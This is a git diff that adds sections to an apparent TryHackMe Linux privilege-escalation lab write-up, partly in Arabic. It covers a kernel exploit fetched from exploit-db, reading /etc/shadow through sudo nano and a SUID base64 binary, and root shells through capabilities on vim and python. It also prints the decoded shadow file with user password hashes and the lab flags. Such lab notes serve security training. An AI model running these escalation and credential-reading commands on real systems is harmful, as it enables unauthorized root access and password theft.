@@ -390,10 +390,404 @@ cd /tmp
 wget https://www.exploit-db.com/raw/37292 -O exploit.c
 ```
 
+```
+gcc exploit.c -o exploit
+./exploit
+```
+
+![image](https://github.com/user-attachments/assets/30b5b5b8-31da-4537-b1cc-626f6dc91fca)
+
+
+```
+THM-28392872729920
+```
 
 
   
 </details>
+
+
+
+
+
+
+
+
+
+
+
+<details>
+  <summary>Privilege Escalation: Sudo</summary>
+
+
+
+![image](https://github.com/user-attachments/assets/c9d1a10a-e3ae-4ac8-8640-3ca05260682b)
+
+
+![image](https://github.com/user-attachments/assets/6fd0efaf-d307-409a-b924-24b7c0ac4202)
+
+
+```
+sudo nano /etc/shadow
+```
+
+![image](https://github.com/user-attachments/assets/1cba0943-d5e7-4d27-a43c-070ddf5c5eb1)
+
+
+
+
+
+
+  
+</details>
+
+
+
+
+
+
+<details>
+  <summary>Privilege Escalation: SUID</summary>
+
+
+list files that have SUID or SGID 
+
+```
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+```ruby
+       66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/10185/bin/mount
+       80     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /snap/core/10185/bin/ping
+       81     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /snap/core/10185/bin/ping6
+       98     40 -rwsr-xr-x   1 root     root        40128 Mar 25  2019 /snap/core/10185/bin/su
+      116     27 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /snap/core/10185/bin/umount
+     2610     71 -rwsr-xr-x   1 root     root        71824 Mar 25  2019 /snap/core/10185/usr/bin/chfn
+     2612     40 -rwsr-xr-x   1 root     root        40432 Mar 25  2019 /snap/core/10185/usr/bin/chsh
+     2689     74 -rwsr-xr-x   1 root     root        75304 Mar 25  2019 /snap/core/10185/usr/bin/gpasswd
+     2781     39 -rwsr-xr-x   1 root     root        39904 Mar 25  2019 /snap/core/10185/usr/bin/newgrp
+     2794     53 -rwsr-xr-x   1 root     root        54256 Mar 25  2019 /snap/core/10185/usr/bin/passwd
+     2904    134 -rwsr-xr-x   1 root     root       136808 Jan 31  2020 /snap/core/10185/usr/bin/sudo
+     3003     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/10185/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     3375    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/10185/usr/lib/openssh/ssh-keysign
+     6437    109 -rwsr-xr-x   1 root     root              110792 Oct  8  2020 /snap/core/10185/usr/lib/snapd/snap-confine
+     7615    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/10185/usr/sbin/pppd
+       56     43 -rwsr-xr-x   1 root     root               43088 Mar  5  2020 /snap/core18/1885/bin/mount
+       65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/1885/bin/ping
+       81     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /snap/core18/1885/bin/su
+       99     27 -rwsr-xr-x   1 root     root               26696 Mar  5  2020 /snap/core18/1885/bin/umount
+     1698     75 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn
+     1700     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh
+     1752     75 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd
+     1816     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp
+     1828     59 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd
+     1919    146 -rwsr-xr-x   1 root     root              149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo
+     2006     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+     2314    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
+     7477     52 -rwsr-xr--   1 root     messagebus         51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    13816    464 -rwsr-xr-x   1 root     root              473576 May 29  2020 /usr/lib/openssh/ssh-keysign
+    13661     24 -rwsr-xr-x   1 root     root               22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+     7479     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+    13676    128 -rwsr-xr-x   1 root     root              130152 Oct  8  2020 /usr/lib/snapd/snap-confine
+     1856     84 -rwsr-xr-x   1 root     root               85064 May 28  2020 /usr/bin/chfn
+     2300     32 -rwsr-xr-x   1 root     root               31032 Aug 16  2019 /usr/bin/pkexec
+     1816    164 -rwsr-xr-x   1 root     root              166056 Jul 15  2020 /usr/bin/sudo
+     1634     40 -rwsr-xr-x   1 root     root               39144 Jul 21  2020 /usr/bin/umount
+     1860     68 -rwsr-xr-x   1 root     root               68208 May 28  2020 /usr/bin/passwd
+     1859     88 -rwsr-xr-x   1 root     root               88464 May 28  2020 /usr/bin/gpasswd
+     1507     44 -rwsr-xr-x   1 root     root               44784 May 28  2020 /usr/bin/newgrp
+     1857     52 -rwsr-xr-x   1 root     root               53040 May 28  2020 /usr/bin/chsh
+     1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
+     1674     68 -rwsr-xr-x   1 root     root               67816 Jul 21  2020 /usr/bin/su
+     2028     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
+     2166     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
+     1633     56 -rwsr-xr-x   1 root     root               55528 Jul 21  2020 /usr/bin/mount
+```
+
+
+```css
+     1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
+```
+
+![image](https://github.com/user-attachments/assets/bf1a3ca9-f1c0-48b9-aff8-beefdd03286a)
+
+
+```
+LFILE=/etc/shadow
+```
+
+now read the file:
+
+
+```
+/usr/bin/base64 "$LFILE"
+```
+
+``output``
+
+```
+cm9vdDoqOjE4NTYxOjA6OTk5OTk6Nzo6OgpkYWVtb246KjoxODU2MTowOjk5OTk5Ojc6OjoKYmlu
+Oio6MTg1NjE6MDo5OTk5OTo3Ojo6CnN5czoqOjE4NTYxOjA6OTk5OTk6Nzo6OgpzeW5jOio6MTg1
+NjE6MDo5OTk5OTo3Ojo6CmdhbWVzOio6MTg1NjE6MDo5OTk5OTo3Ojo6Cm1hbjoqOjE4NTYxOjA6
+OTk5OTk6Nzo6OgpscDoqOjE4NTYxOjA6OTk5OTk6Nzo6OgptYWlsOio6MTg1NjE6MDo5OTk5OTo3
+Ojo6Cm5ld3M6KjoxODU2MTowOjk5OTk5Ojc6OjoKdXVjcDoqOjE4NTYxOjA6OTk5OTk6Nzo6Ogpw
+cm94eToqOjE4NTYxOjA6OTk5OTk6Nzo6Ogp3d3ctZGF0YToqOjE4NTYxOjA6OTk5OTk6Nzo6Ogpi
+YWNrdXA6KjoxODU2MTowOjk5OTk5Ojc6OjoKbGlzdDoqOjE4NTYxOjA6OTk5OTk6Nzo6OgppcmM6
+KjoxODU2MTowOjk5OTk5Ojc6OjoKZ25hdHM6KjoxODU2MTowOjk5OTk5Ojc6OjoKbm9ib2R5Oio6
+MTg1NjE6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4NTYxOjA6OTk5OTk6Nzo6Ogpz
+eXN0ZW1kLXJlc29sdmU6KjoxODU2MTowOjk5OTk5Ojc6OjoKc3lzdGVtZC10aW1lc3luYzoqOjE4
+NTYxOjA6OTk5OTk6Nzo6OgptZXNzYWdlYnVzOio6MTg1NjE6MDo5OTk5OTo3Ojo6CnN5c2xvZzoq
+OjE4NTYxOjA6OTk5OTk6Nzo6OgpfYXB0Oio6MTg1NjE6MDo5OTk5OTo3Ojo6CnRzczoqOjE4NTYx
+OjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4NTYxOjA6OTk5OTk6Nzo6Ogp0Y3BkdW1wOio6MTg1NjE6
+MDo5OTk5OTo3Ojo6CnNzaGQ6KjoxODU2MTowOjk5OTk5Ojc6OjoKbGFuZHNjYXBlOio6MTg1NjE6
+MDo5OTk5OTo3Ojo6CnBvbGxpbmF0ZToqOjE4NTYxOjA6OTk5OTk6Nzo6OgplYzItaW5zdGFuY2Ut
+Y29ubmVjdDohOjE4NTYxOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVkdW1wOiEhOjE4Nzk2Ojo6
+Ojo6CnVidW50dTohOjE4Nzk2OjA6OTk5OTk6Nzo6OgpnZXJyeWNvbndheTokNiR2Z3pneE0zeWJU
+bEIud2tWJDQ4WURZN3FRbnA0cHVyT0oxOW14Zk1Pd0t0LkgyTGFXS1B1MHpLbFdLYVVNRzFON3dl
+Vnpxb2JwNjVSeGxNSVovTmlyeGVaZE9KTUVPcDNvZkUuUlQvOjE4Nzk2OjA6OTk5OTk6Nzo6Ogp1
+c2VyMjokNiRtNlZtektUYnpDRC8uSTEwJGNLT3ZaWjgvcnNZd0hkLnBFMDk5WlJ3TTY4NnAvRXAx
+M2g3cEZNQkNHNHQ3SXVrUnFjL2ZYbEExZ0hYaDlGMkNid21ENEVwaTFXZ2guQ2wuVlYxbWIvOjE4
+Nzk2OjA6OTk5OTk6Nzo6OgpseGQ6IToxODc5Njo6Ojo6OgprYXJlbjokNiRWamNyS3ovNlM4cmhW
+NEk3JHlib1RiME1FeHFwTVhXMGhqRUpncUxXcy9qR1BKQTdOL2ZFb1BNdVlMWTF3MTZGd0w3RUND
+YlFXSnFZTEdweS5ac2NuYTlHSUxDU2FOTEpkQlAxcDgvOjE4Nzk2OjA6OTk5OTk6Nzo6Ogo=
+```
+
+it return ``/etc/shadow`` but encoded 
+
+```
+/usr/bin/base64 "$LFILE" | base64 --decode
+```
+
+`output`
+
+```
+root:*:18561:0:99999:7:::
+daemon:*:18561:0:99999:7:::
+bin:*:18561:0:99999:7:::
+sys:*:18561:0:99999:7:::
+sync:*:18561:0:99999:7:::
+games:*:18561:0:99999:7:::
+man:*:18561:0:99999:7:::
+lp:*:18561:0:99999:7:::
+mail:*:18561:0:99999:7:::
+news:*:18561:0:99999:7:::
+uucp:*:18561:0:99999:7:::
+proxy:*:18561:0:99999:7:::
+www-data:*:18561:0:99999:7:::
+backup:*:18561:0:99999:7:::
+list:*:18561:0:99999:7:::
+irc:*:18561:0:99999:7:::
+gnats:*:18561:0:99999:7:::
+nobody:*:18561:0:99999:7:::
+systemd-network:*:18561:0:99999:7:::
+systemd-resolve:*:18561:0:99999:7:::
+systemd-timesync:*:18561:0:99999:7:::
+messagebus:*:18561:0:99999:7:::
+syslog:*:18561:0:99999:7:::
+_apt:*:18561:0:99999:7:::
+tss:*:18561:0:99999:7:::
+uuidd:*:18561:0:99999:7:::
+tcpdump:*:18561:0:99999:7:::
+sshd:*:18561:0:99999:7:::
+landscape:*:18561:0:99999:7:::
+pollinate:*:18561:0:99999:7:::
+ec2-instance-connect:!:18561:0:99999:7:::
+systemd-coredump:!!:18796::::::
+ubuntu:!:18796:0:99999:7:::
+gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
+user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
+lxd:!:18796::::::
+karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::
+```
+
+``user2`` hash
+
+```
+$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/
+```
+
+![image](https://github.com/user-attachments/assets/20bd2e82-a055-4cb4-ba9c-70dad84c7076)
+
+using same way to read ``flag3.txt``
+
+```
+LFILE=/home/ubuntu/flag3.txt
+/usr/bin/base64 "$LFILE" | base64 --decode
+```
+
+![image](https://github.com/user-attachments/assets/284627cd-cc2d-483b-8f0d-f3c420f4b2a7)
+
+```
+THM-3847834
+```
+
+  
+</details>
+
+
+
+
+
+
+<details>
+  <summary>Privilege Escalation: Capabilities</summary>
+
+
+# 🔐 Linux Capabilities & Privilege Escalation
+
+## 🧠 ما هي Linux Capabilities؟
+
+في أنظمة لينكس الحديثة، يمكن منح **صلاحيات جزئية** للبرامج بدون الحاجة لتشغيلها بصلاحيات `root`.  
+هذه الصلاحيات تُعرف باسم: **Capabilities**
+
+مثال:
+- `cap_net_raw` → يسمح بفتح raw sockets (مفيد لأدوات الشبكة)
+- `cap_dac_read_search` → يسمح بقراءة ملفات بدون صلاحية قراءة
+
+---
+
+## 🎯 الهدف في الـ Privilege Escalation
+
+نبحث عن برامج تمتلك Capabilities قوية يمكن استغلالها للوصول إلى صلاحيات `root`.
+
+---
+
+## 🔍 كيف نبحث عن الملفات ذات Capabilities؟
+
+استخدم الأمر التالي من مستخدم عادي:
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+- `-r /` → يبحث بشكل تكراري في كل النظام
+- `2>/dev/null` → يتجاهل رسائل الخطأ
+
+---
+
+## 💡 ملاحظات هامة:
+
+| النوع         | أداة الكشف        |
+|--------------|------------------|
+| SUID         | `find`           |
+| Capabilities | `getcap`         |
+
+> Capabilities لا تظهر في فحص الـ SUID، لذلك تحتاج لفحص خاص.
+
+---
+
+## 🧰 GTFObins — أداة ممتازة للاستغلال
+
+موقع GTFObins يحتوي على قائمة ببرامج يمكن استغلالها:
+
+🔗 [https://gtfobins.github.io](https://gtfobins.github.io)
+
+ابحث عن أي برنامج (مثل `vim`, `perl`, `python`, `tar`) وتحقق إذا كان له استغلال تحت قسم **Capabilities**.
+
+---
+
+## 🧪 مثال عملي: استغلال vim بوجود Capability
+
+### 1. تحقق من وجود capability على vim:
+
+```bash
+/usr/bin/vim = cap_setuid+ep
+```
+
+### 2. شغّل vim مع أمر تنفيذ داخلي:
+
+```bash
+vim -c ':!sh'
+```
+
+### 3. تحقق من الصلاحيات:
+
+```bash
+id
+# uid=0(root) gid=0(root)
+```
+
+✅ مبروك! حصلت على shell بصلاحيات root.
+
+---
+
+## ✅ ملخص سريع
+
+| العنصر              | الشرح |
+|---------------------|-------|
+| Capabilities         | صلاحيات جزئية تُمنح للبرامج بدلاً من root الكامل |
+| getcap               | أداة لفحص البرامج ذات Capabilities |
+| استغلال capabilities | إذا كان البرنامج يملك capability قوية، يمكن تشغيله والحصول على صلاحيات أعلى |
+| GTFObins             | موقع يعرض طرق استغلال البرامج المعروفة |
+
+---
+
+## 🔚 الخطوة التالية
+
+- شغّل:
+```bash
+getcap -r / 2>/dev/null
+```
+
+- ثم راجع النتائج وأرسل البرامج هنا لتحليل فرص التصعيد 🚀
+
+
+
+
+
+
+## 🟥 Capabilities خطيرة جدًا:
+
+| Capability            | خطورتها                                         |
+| --------------------- | ----------------------------------------------- |
+| `cap_setuid`          | تغيير UID (يعني ممكن يشغّل نفسه كـ root) 😈     |
+| `cap_sys_admin`       | شبه صلاحيات root، كنز حقيقي 💣                  |
+| `cap_dac_override`    | يتجاوز صلاحيات الملفات، ممكن يقرأ/يكتب أي ملف   |
+| `cap_dac_read_search` | يقرأ أي ملف حتى لو مالكوش صلاحية عليه           |
+| `cap_fowner`          | يقدر يعدل على ملفات مش بتاعته                   |
+| `cap_net_raw`         | يستخدم RAW sockets، ممكن sniff أو spoof الشبكة  |
+| `cap_sys_ptrace`      | ممكن يعمل Debug على عمليات تانية (وسرقة بيانات) |
+
+
+
+## 🟡 Capabilities متوسطة الخطورة:
+
+
+| Capability             | ملاحظات                                                |
+| ---------------------- | ------------------------------------------------------ |
+| `cap_net_bind_service` | يفتح بورت أقل من 1024 (ممكن استخدامه لتصعيد داخل خدمة) |
+| `cap_chown`            | يغير مالك الملفات — مفيد في بعض السيناريوهات           |
+| `cap_kill`             | يقتل أي عملية — ممكن يستخدم لإيقاف الحماية أو الخدمات  |
+
+
+## 🧪 مثال عملي:
+
+```
+/usr/bin/python3.8 = cap_setuid+ep
+```
+
+ده معناه إن ``python3.8`` يقدر يغير الـ UID ويشتغل كـ root
+لو شغلته كده:
+
+```
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+```
+
+لو نجحت، هيجيلك شيل بصلاحيات root مباشرة 💥
+
+
+## 🧠 مصادر تعرفك خطورة أي capability:
+🔗 [man 7 capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
+
+🔍 موقع GTFObins: ابحث عن اسم البرنامج وشوف لو له استغلال تحت Capabilities
+
+🔐 أداة linpeas.sh ``→`` تعرضلك البرامج ``+`` capabilities ``+`` تقييم خطورتها
+
+
+
+  
+</details>
+
 
 
 
